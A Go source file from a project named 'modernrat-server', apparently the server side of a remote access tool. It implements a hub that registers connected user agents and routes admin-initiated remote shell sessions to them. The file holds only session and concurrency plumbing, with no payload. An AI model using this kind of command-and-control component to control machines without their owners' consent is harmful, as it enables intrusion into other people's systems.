package main

import (
	"errors"
	"fmt"
	"sync"
	"time"

	"github.com/google/uuid"
	pb "modernrat-server/gen"
)

// shellHub keeps track of connected user agents and active shell sessions.
type shellHub struct {
	mu       sync.RWMutex
	clients  map[string]*shellClientConnection
	sessions map[string]*shellSession
}

func newShellHub() *shellHub {
	return &shellHub{
		clients:  make(map[string]*shellClientConnection),
		sessions: make(map[string]*shellSession),
	}
}

// shellClientConnection represents a user agent connection that can receive shell messages.
type shellClientConnection struct {
	userID string
	stream pb.RemoteShellService_ClientShellServer

	sendCh    chan *pb.ShellMessage
	doneCh    chan struct{}
	closeOnce sync.Once
}

func newShellClientConnection(userID string, stream pb.RemoteShellService_ClientShellServer) *shellClientConnection {
	conn := &shellClientConnection{
		userID: userID,
		stream: stream,
		sendCh: make(chan *pb.ShellMessage, 64),
		doneCh: make(chan struct{}),
	}

	go conn.sender()
	return conn
}

func (c *shellClientConnection) sender() {
	defer close(c.doneCh)

	for msg := range c.sendCh {
		if err := c.stream.Send(msg); err != nil {
			return
		}
	}
}

func (c *shellClientConnection) Send(msg *pb.ShellMessage) error {
	select {
	case <-c.doneCh:
		return errors.New("client connection is closed")
	case c.sendCh <- msg:
		return nil
	}
}

func (c *shellClientConnection) Close() {
	c.closeOnce.Do(func() {
		close(c.sendCh)
		<-c.doneCh
	})
}

// shellAdminConnection represents an admin stream that should receive shell output.
type shellAdminConnection struct {
	stream pb.RemoteShellService_AdminShellServer

	sendCh    chan *pb.ShellMessage
	doneCh    chan struct{}
	closeOnce sync.Once
}

func newShellAdminConnection(stream pb.RemoteShellService_AdminShellServer) *shellAdminConnection {
	conn := &shellAdminConnection{
		stream: stream,
		sendCh: make(chan *pb.ShellMessage, 64),
		doneCh: make(chan struct{}),
	}

	go conn.sender()
	return conn
}

func (c *shellAdminConnection) sender() {
	defer close(c.doneCh)

	for msg := range c.sendCh {
		if err := c.stream.Send(msg); err != nil {
			return
		}
	}
}

func (c *shellAdminConnection) Send(msg *pb.ShellMessage) error {
	select {
	case <-c.doneCh:
		return errors.New("admin connection is closed")
	case c.sendCh <- msg:
		return nil
	}
}

func (c *shellAdminConnection) Close() {
	c.closeOnce.Do(func() {
		close(c.sendCh)
		<-c.doneCh
	})
}

// shellSession links an admin connection with a user connection.
type shellSession struct {
	id     string
	userID string

	adminConn  *shellAdminConnection
	clientConn *shellClientConnection
	startedAt  time.Time
}

func (h *shellHub) registerClient(conn *shellClientConnection) (orphaned []*shellSession) {
	h.mu.Lock()
	defer h.mu.Unlock()

	if existing, ok := h.clients[conn.userID]; ok && existing != conn {
		orphaned = h.detachSessionsLocked(existing)
	}

	h.clients[conn.userID] = conn
	return orphaned
}

func (h *shellHub) unregisterClient(conn *shellClientConnection) (ended []*shellSession) {
	h.mu.Lock()
	defer h.mu.Unlock()

	current, ok := h.clients[conn.userID]
	if !ok || current != conn {
		return nil
	}

	delete(h.clients, conn.userID)
	return h.detachSessionsLocked(conn)
}

func (h *shellHub) detachSessionsLocked(conn *shellClientConnection) (ended []*shellSession) {
	for id, session := range h.sessions {
		if session.clientConn == conn {
			delete(h.sessions, id)
			ended = append(ended, session)
		}
	}

	return ended
}

func (h *shellHub) startSession(userID string, adminConn *shellAdminConnection) (*shellSession, error) {
	h.mu.Lock()
	defer h.mu.Unlock()

	clientConn, ok := h.clients[userID]
	if !ok {
		return nil, fmt.Errorf("user %s is not connected", userID)
	}

	sessionID := generateSessionID()
	session := &shellSession{
		id:         sessionID,
		userID:     userID,
		adminConn:  adminConn,
		clientConn: clientConn,
		startedAt:  time.Now(),
	}

	h.sessions[sessionID] = session

	return session, nil
}

func (h *shellHub) endSession(sessionID string) (*shellSession, bool) {
	h.mu.Lock()
	defer h.mu.Unlock()

	session, ok := h.sessions[sessionID]
	if !ok {
		return nil, false
	}

	delete(h.sessions, sessionID)

	return session, true
}

func (h *shellHub) getSession(sessionID string) (*shellSession, bool) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	session, ok := h.sessions[sessionID]
	return session, ok
}

func (h *shellHub) listSessionsForUser(userID string) []*shellSession {
	h.mu.RLock()
	defer h.mu.RUnlock()

	var sessions []*shellSession
	for _, session := range h.sessions {
		if session.userID == userID {
			sessions = append(sessions, session)
		}
	}
	return sessions
}

func (h *shellHub) endAllSessions() []*shellSession {
	h.mu.Lock()
	defer h.mu.Unlock()

	if len(h.sessions) == 0 {
		return nil
	}

	ended := make([]*shellSession, 0, len(h.sessions))
	for id, session := range h.sessions {
		ended = append(ended, session)
		delete(h.sessions, id)
	}

	return ended
}

func generateSessionID() string {
	return uuid.NewString()
}
